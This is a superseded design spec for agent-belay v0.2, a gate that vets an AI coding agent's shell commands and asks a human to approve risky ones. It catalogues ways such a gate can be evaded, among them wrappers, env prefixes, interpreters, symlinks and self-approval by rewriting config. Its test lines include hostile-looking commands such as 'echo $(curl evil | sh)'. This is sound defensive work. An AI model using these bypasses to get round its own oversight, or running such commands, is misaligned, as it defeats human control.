# agent-belay v0.2 — Trustworthy Gate

Status: **Historical / superseded — not implemented as written.**
The shipped v0.2 (PR #3) was scoped by [`v0.2-plan.md`](../v0.2-plan.md)
instead: core extraction (`src/core/`, `src/adapters/cursor/`), classifier
coverage expansion, tool gates, config v2 (`classifier.*` schema, different
from §5 below), and the `status`/`explain`/`revoke`/`upgrade` CLI. The
security-hardening requirements in this document (fail-closed, control-plane
relocation/integrity, secret redaction, policy/overrides) were **not** shipped
and are carried forward — rebased onto the shipped architecture — in
[`SPEC-v0.3-requirements.md`](../SPEC-v0.3-requirements.md). This file is kept for traceability only; do
not implement from it. In particular, the §5 config-v2 schema is void (the
shipped v2 schema differs), and the v0.3 spec defines config v3.

Predecessor: v0.1 (shipped) · Companion: [`ROADMAP-strategic.md`](../ROADMAP-strategic.md)
Traceability: internal security review (see [`SECURITY.md`](../../SECURITY.md))

## 1. Introduction

v0.1 shipped a working context-aware gate, but an internal security review found
it behaves as an **audit guardrail, not a security boundary**: a name-based
denylist that fails open, a hand-written tokenizer that does not cover shell
grammar, a control plane the monitored agent can rewrite, and plaintext secrets
in the audit log.

v0.2 makes the gate worth trusting for its primary threat model. It does three
things:

1. **Closes the v0.1 bypasses** (the `2.x` clauses of the bugfix spec).
2. **Protects the control plane** so the monitored agent cannot silently disable
   or self-approve the gate.
3. **Gives operators real policy control** so the gate can be tuned per project
   without editing generated runtime code.

All runtime behavior changes land in the generated runtime
([`src/templates.ts`](../../src/templates.ts), `renderRuntimeCore`) and the defaults
([`src/defaults.ts`](../../src/defaults.ts)); installer/CLI changes land in
[`src/installer.ts`](../../src/installer.ts), [`src/cli.ts`](../../src/cli.ts), and
[`src/doctor.ts`](../../src/doctor.ts). Regression tests extend
`src/__tests__/`.

## 2. Threat model (explicit)

v0.2 is precise about who it defends against, because that determines what "fail
closed" and "protect the control plane" can honestly mean.

- **Primary (v0.2 defends against this): a cooperative-but-fallible or mildly
  misaligned agent.** It generally respects tool and permission boundaries — it
  will not deliberately escalate OS privileges — but it *will* run risky commands
  by mistake, take shortcuts, or reach for an effect (deploy, push, delete)
  without realizing the blast radius. For this model, relocating mutable state
  out of the repo, hash-pinning the runtime, and failing closed on ambiguity are
  meaningful, enforceable boundaries.

- **Secondary (documented, not fully solved): an adversarial agent with
  unrestricted shell as the same OS user.** Because Belay's hooks run as that
  same user, such an agent can in principle reach any path the user can,
  including a relocated control plane. v0.2 raises the cost and makes tampering
  *detectable* (integrity checks), but it cannot *guarantee* containment without
  OS-level controls (separate user, sandbox, file ACLs). This limitation SHALL be
  stated plainly in `SECURITY.md`. Closing it is out of scope for v0.2.

This distinction is the spec's backbone: every requirement below is enforceable
against the primary model, and we never claim more than that.

## 3. Goals / Non-goals

### Goals

- G1. Fail closed: unknown or unparseable gated actions escalate to
  `deny_pending_approval` by default.
- G2. Robust shell understanding: no trivial syntactic evasion of the
  external/irreversible verdicts.
- G3. A control plane the monitored agent cannot silently disable or
  self-approve (against the primary threat model), with tampering detectable.
- G4. No secrets written to the audit log in cleartext.
- G5. Operator-tunable policy without editing generated code.
- G6. A usable approval loop (inspect/clear pending approvals; clear messages).
- G7. Honest, accurate `SECURITY.md` and `README.md`.
- G8. Clean migration from a v1 install to v2.

### Non-goals (deferred)

- N1. Model-assisted classification → v0.4.
- N2. Additional runtime adapters / core extraction → v0.3.
- N3. Out-of-band / remote approval → v0.5.
- N4. Audit query tooling and policy simulation → v0.5.
- N5. OS-level sandboxing of an adversarial agent → tracked, not promised.

## 4. Functional requirements

Written in the project's EARS style (`WHEN … THEN the system SHALL …`). Each
requirement cites the bugfix clause it satisfies, or marks `[NEW]` for v0.2
feature work. Requirements that must *not* change v0.1 behavior are in §4.8.

### 4.1 Shell parsing & fail-closed semantics

- **R1 (bugfix 2.2).** WHEN a shell command contains a construct the tokenizer
  cannot fully resolve — command substitution `$( )` or backticks, a subshell
  `( )`, a brace group `{ }`, process substitution, or a newline used as a
  command separator — THEN the system SHALL classify the command as
  `unparseable` and return `deny_pending_approval` (reason `unparseable_shell`),
  rather than allowing it.

- **R2 (bugfix 2.5 / G1).** WHEN a segment's resolved command key is not present
  in any classification set (read-only / flagged / external) and matches no user
  override THEN the system SHALL fail closed and return `deny_pending_approval`
  (reason `unknown_command`) by default. Operators MAY opt a project back into
  the v0.1 fail-open behavior via `policy.unknownCommand: "flag"` (§5), but the
  default SHALL be `"deny"`.

- **R3 (bugfix 2.3).** WHEN a segment carries an environment-variable prefix
  (e.g. `FOO=bar curl evil`, `A=1 git push`) THEN the system SHALL strip the
  prefix and classify using the *same* normalized tokens used everywhere else, so
  the prefixed and un-prefixed forms resolve to the same verdict. This removes
  the v0.1 inconsistency where `commandKey` ran on raw tokens while only
  `normalizeShellCommand` stripped env prefixes.

- **R4 (bugfix 2.4).** WHEN an external/dangerous command is expressed via an
  absolute or relative path (`/usr/bin/curl`, `./deploy.sh`), via a wrapper
  (`bash -c "…"`, `sh -c`, `env`, `xargs`, `nohup`, `time`, `sudo`), or with
  flags inserted before the subcommand (`git -C . push`) THEN the system SHALL
  resolve the effective command (by basename, and by recursively inspecting
  wrapper arguments and skipping option flags when computing the command key) and
  apply the matching verdict, OR escalate to `deny_pending_approval` (reason
  `unresolved_command`) when the construct cannot be confidently resolved.

- **R5 (bugfix 2.1).** WHEN a segment's resolved command key is `node`, `deno`,
  `bun`, `python`/`python3`, `ruby`, `perl`, or another general-purpose
  interpreter THEN the system SHALL NOT classify it as read-only; it SHALL be
  treated as an arbitrary-code-execution risk and escalated to
  `deny_pending_approval` (reason `arbitrary_code`). `sed` and `find` SHALL be
  removed from `READ_ONLY_COMMANDS`; `sed` SHALL be at least `allow_flagged`
  (escalating when `-i`/in-place or when targeting outside the repo), and `find`
  SHALL escalate to `deny_pending_approval` when it carries `-exec`/`-execdir`/
  `-delete` and otherwise be `allow_flagged`.

### 4.2 Path containment

- **R6 (bugfix 2.8).** WHEN a mutation target or redirect target resolves —
  after `realpath`/symlink resolution — to a path outside the repository root
  THEN the system SHALL return the appropriate `outside_repo_redirect` /
  `outside_repo_mutation` `deny_pending_approval` verdict. Containment checks
  (`relativeWithinRepo` and callers) SHALL resolve the real path before the
  string-based containment math, closing the in-repo-symlink-to-outside bypass.

### 4.3 Subagent / Task intent classification

- **R7 (bugfix 2.9).** WHEN a subagent/Task payload is classified THEN the system
  SHALL use token/whole-word aware matching (not raw substring matching on the
  lowercased JSON), so benign wording like "respond" or "production-ready" is not
  mis-flagged as `send`/`prod`, while genuine external-effect intent is still
  escalated. Payloads the system cannot confidently classify SHALL escalate to
  `deny_pending_approval`.

### 4.4 Control-plane integrity

- **R8 (bugfix 2.6 / G3).** WHEN `init` installs the gate THEN mutable approval
  state (`pending-approvals.json`, `approved-approvals.json`) SHALL be stored
  outside the monitored repository — in an OS user-config location keyed by the
  repo's real path (e.g. `~/.config/agent-belay/<repo-key>/`, honoring
  `XDG_CONFIG_HOME`) — so an agent operating within the repo cannot write
  self-approvals into the state the gate reads. The audit log MAY remain in-repo
  (default, configurable) since it is append-only and lower-risk than approval
  state.

- **R9 (bugfix 2.6 / G3).** WHEN `init` installs the gate THEN it SHALL record a
  content hash of the generated `core.mjs` and the effective `belay.config.json`
  in the out-of-repo control-plane location. WHEN any gate hook starts THEN it
  SHALL verify the in-repo `core.mjs` and config against those pinned hashes;
  on mismatch the gate SHALL fail closed (deny gated actions, reason
  `control_plane_tampered`) and emit a clear operator message pointing at
  `agent-belay doctor`.

- **R10 (bugfix 2.6 / G3).** WHEN a gated shell command's resolved mutation or
  redirect target is a control-plane file — `belay.config.json`, the relocated
  approval-state files, `hooks.json`, any `belay-*.mjs` hook, or
  `belay/runtime/core.mjs` — THEN the system SHALL escalate the write to
  `deny_pending_approval` (reason `control_plane_write`), regardless of whether
  the path is otherwise in-repo.

- **R11 (bugfix 2.6).** The "the monitored side can rewrite its own gate, and
  why relocation/integrity only mitigate this against the primary threat model"
  assumption SHALL be documented in `SECURITY.md` (ties to §2).

### 4.5 Secret redaction

- **R12 (bugfix 2.7 / G4).** WHEN any audited value is written to
  `audit.ndjson` THEN the system SHALL scrub common secret patterns before
  writing — at minimum `Bearer <token>`, `Authorization:` header values,
  `key`/`token`/`secret`/`password`-style `name=value` pairs, and long
  high-entropy strings — in addition to the existing UUID / ISO-timestamp /
  approval-id masking in `scrubString`. Redaction SHALL preserve enough structure
  that the entry is still useful for audit (mask the value, keep the key/shape).
  Operators MAY add patterns via `redaction.patterns` (§5).

### 4.6 Policy & overrides `[NEW]`

- **R13 [NEW].** WHEN `belay.config.json` declares `policy` settings THEN the
  runtime SHALL honor them: `policy.unknownCommand` (`"deny"` default | `"flag"`)
  controls R2, and `policy.unparseableShell` (`"deny"` default | `"flag"`)
  controls R1. This lets a project consciously trade strictness for noise without
  editing generated code.

- **R14 [NEW].** WHEN `belay.config.json` declares `overrides` THEN the runtime
  SHALL evaluate them against the resolved command key / normalized command
  before the built-in command sets: `overrides.deny` → `deny_pending_approval`,
  `overrides.flag` → `allow_flagged`, `overrides.allow` → `allow`. Patterns SHALL
  use a simple, documented glob (`*` wildcard) form. Precedence SHALL be:
  control-plane write (R10) > `overrides.deny` > built-in external/outside-repo
  > `overrides.flag` > `overrides.allow` > built-in read-only > fail-closed
  default (R2). This precedence SHALL be documented and tested so an override
  cannot silently re-allow a control-plane write or an outside-repo effect.

### 4.7 Approval UX & CLI `[NEW]`

- **R15 [NEW].** WHEN the operator runs `agent-belay approvals` THEN the CLI
  SHALL list pending approvals (id, kind, reason, redacted summary, age, expiry)
  from the relocated control plane for the current repo. `agent-belay approvals
  --clear` SHALL drop all pending approvals; `--json` SHALL emit machine output.

- **R16 [NEW].** WHEN the gate denies an action THEN the `user_message` SHALL
  include the reason, a redacted one-line summary of what was blocked, the
  approval id, and the exact retry instruction — so the human approving has
  enough context to decide without inspecting files.

### 4.8 Preserved behavior (regression prevention)

These v0.1 behaviors MUST NOT change (bugfix `3.x`):

- **R17 (3.1).** Genuine read-only commands that are not interpreters
  (`rg`, `ls`, `cat`, `git status`, `git diff`, `git log`) → `allow`.
- **R18 (3.2).** Recognized in-repo mutations (`touch`, `mkdir`, `git add`,
  `git commit`) → `allow_flagged`, recorded in the audit log.
- **R19 (3.3).** Recognized external-effect commands (`git push`, `curl`,
  `npm publish`) → `deny_pending_approval` with reason `external_effect`.
- **R20 (3.4).** Non-symlink mutations/redirects outside the repo (relative or
  absolute) → `deny_pending_approval` with the existing `outside_repo_*` reasons.
- **R21 (3.5).** Subagent payloads with clearly recognized external intent →
  `deny_pending_approval` (reason `external_subagent_intent`), with distinct
  payloads fingerprinted separately.
- **R22 (3.6).** A valid `/belay-approve <id>` moves a pending approval to
  approved and allows exactly one matching action once before expiry, then
  resumes denying.
- **R23 (3.7).** `mode: "audit"` logs would-be denies but allows execution.
- **R24 (3.8).** Disabling a gate through the protected config path
  (`gates.shell: false` / `gates.subagent: false`) returns `allow` for that gate.
- **R25 (3.9).** A throwing shell-gate hook fails closed (`permission: "deny"`).

## 5. Config schema v2

`belay.config.json` bumps to `version: 2`. New fields are additive; v1 configs
migrate by filling defaults (§6).

```json
{
  "version": 2,
  "mode": "enforce",
  "approvalTtlMinutes": 15,
  "tokenPrefix": "/belay-approve",
  "gates": { "shell": true, "subagent": true },
  "policy": {
    "unknownCommand": "deny",
    "unparseableShell": "deny"
  },
  "overrides": {
    "allow": [],
    "flag": [],
    "deny": []
  },
  "redaction": {
    "enabled": true,
    "patterns": []
  },
  "controlPlane": {
    "stateLocation": "user-config",
    "integrity": "hash-pinned"
  },
  "audit": { "logPath": ".cursor/belay/audit.ndjson" }
}
```

Field notes:

- `policy.unknownCommand` / `policy.unparseableShell`: `"deny"` (default,
  fail-closed) or `"flag"` (opt-in fail-open). See R1, R2, R13.
- `overrides.{allow,flag,deny}`: glob patterns over the resolved command key /
  normalized command, evaluated per §4.6 precedence. See R14.
- `redaction.enabled` / `redaction.patterns`: built-in secret masking on/off plus
  extra operator regex. See R12.
- `controlPlane.stateLocation`: `"user-config"` (default; approvals stored out of
  repo, R8) or `"repo"` (opt back into v1 location, documented as weaker).
- `controlPlane.integrity`: `"hash-pinned"` (default, R9) or `"none"`.

Config typings in [`src/types.ts`](../../src/types.ts) (`BelayConfig`) and the
`DEFAULT_CONFIG` in [`src/defaults.ts`](../../src/defaults.ts) update accordingly;
the runtime's config merge SHALL deep-merge the new nested sections the way it
already does for `gates`/`audit`.

## 6. Migration & backward compatibility

- **M1.** WHEN `init` finds an existing v1 `belay.config.json` THEN it SHALL
  rewrite it as v2, preserving any operator-set `mode`, `approvalTtlMinutes`,
  `tokenPrefix`, `gates`, and `audit.logPath`, and filling new sections with
  defaults. (Consistent with the existing "init rewrites managed config" rule.)
- **M2.** WHEN `init` runs under v0.2 with `controlPlane.stateLocation:
  "user-config"` and finds v1 in-repo approval files THEN it SHALL migrate any
  unexpired approvals to the relocated location and leave a short note; stale
  in-repo files become inert.
- **M3.** The runtime config merge SHALL treat a missing `version`/`version: 1`
  config as v1 and apply v2 defaults, so a partially-upgraded repo still runs.
- **M4.** `--with-skill` / deprecated `--nightly` behavior is unchanged.

## 7. Testing requirements

All new behavior is verified through the generated runtime (as the existing
`src/__tests__/hooks-runtime.test.ts` does — spawn the runner, feed a payload,
assert the verdict), plus installer/CLI unit tests.

- **T1.** Bypass regression suite: one failing-then-passing test per bugfix
  clause `2.1`–`2.9` (maps to R1–R12), e.g. `node -e`, `find … -exec curl`,
  `echo $(curl evil | sh)`, `FOO=bar curl evil`, `bash -c "curl evil"`,
  `git -C . push`, unknown command, control-plane write, `Bearer` token in audit,
  in-repo symlink → outside.
- **T2.** Preservation suite: R17–R25 keep their v0.1 verdicts (extend the
  existing read-only / mutation / external / approval-flow tests).
- **T3.** Control plane: approval state is created outside the repo; a tampered
  `core.mjs`/config trips the integrity check and fails closed; a gated write to
  a control-plane file is denied.
- **T4.** Policy & overrides: precedence (§4.6) is enforced — an `overrides.allow`
  cannot re-allow a control-plane write or an outside-repo effect; `unknownCommand
  : "flag"` restores fail-open for unknowns only.
- **T5.** Redaction: a secret-bearing command is masked in `audit.ndjson` while
  its non-secret structure and verdict remain.
- **T6.** Migration: a v1 install upgrades to v2 preserving operator settings and
  migrating unexpired approvals (M1–M3).
- **T7.** CLI: `agent-belay approvals` lists and clears; `doctor` reports
  control-plane integrity status.

`pnpm lint`, `pnpm typecheck`, `pnpm test`, and `pnpm build` SHALL pass, per
[`CONTRIBUTING.md`](../../CONTRIBUTING.md).

## 8. Acceptance criteria (definition of done)

1. Every `2.x` clause of the security bugfix spec has a passing regression test
   (T1); no `3.x` preservation test regresses (T2).
2. Default-config installs fail closed on unknown and unparseable commands.
3. Approval state lives outside the monitored repo by default; integrity
   mismatch and control-plane writes both fail closed (T3).
4. No secret from the curated test corpus appears in cleartext in `audit.ndjson`
   (T5).
5. `policy` and `overrides` change verdicts as specified, and cannot override the
   control-plane / outside-repo protections (T4).
6. `agent-belay approvals` and the extended `doctor` work and are documented
   (T7).
7. `README.md` and `SECURITY.md` describe the v0.2 behavior and the §2 threat
   model accurately — no guardrail is described as a boundary.
8. A v1 install upgrades cleanly (T6).

## 9. Risks & open questions

- **OQ1.** Relocating approval state changes the `/belay-approve` round trip
  (the `beforeSubmitPrompt` hook now reads/writes out-of-repo state). Confirm the
  Cursor runner has reliable access to the user-config path in all install
  layouts.
- **OQ2.** Hash-pinning must not break the legitimate `init`-rewrites-managed-
  files flow; re-`init` SHALL re-pin. Define the exact moment hashes are written
  vs. verified.
- **OQ3.** Aggressive fail-closed defaults risk noise that drives users to
  disable the gate. The `overrides` allowlist and a tight approval loop (R15,
  R16) are the mitigation; watch real allow/deny ratios before locking defaults.
- **OQ4.** Wrapper resolution (R4) is recursive and could itself become a parsing
  surface; prefer "escalate when unsure" over clever resolution.
- **OQ5.** Redaction (R12) trades audit fidelity for safety; over-redaction can
  hide what actually happened. Keep masking structure-preserving and tested.

## 10. Out of scope for v0.2

Deferred per §3 non-goals: model-assisted classification (v0.4), core/adapter
extraction and a second runtime (v0.3), out-of-band approval and audit query
tooling (v0.5), and OS-level sandboxing of an adversarial agent (tracked, not
promised). See [`ROADMAP-strategic.md`](../ROADMAP-strategic.md).
